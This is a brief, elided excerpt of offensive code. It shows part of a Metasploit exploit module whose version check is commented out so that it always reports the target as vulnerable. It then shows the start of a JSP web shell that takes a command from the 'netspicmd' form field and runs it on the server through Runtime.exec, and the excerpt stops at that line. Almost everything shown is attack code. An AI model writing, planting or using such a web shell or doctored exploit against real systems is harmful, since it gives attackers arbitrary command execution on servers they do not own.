...
class Metasploit4 < Msf::Exploit::Remote
  ...
  def check
    ...
    return Exploit::CheckCode::Appears #if res.body =~ /CVSTag=Branch_4_/ # nullbind mod - suppress version check 
...
<INPUT TYPE="text" NAME="netspicmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("netspicmd") != null) {
        out.println("Command: " + request.getParameter("netspicmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("netspicmd"));
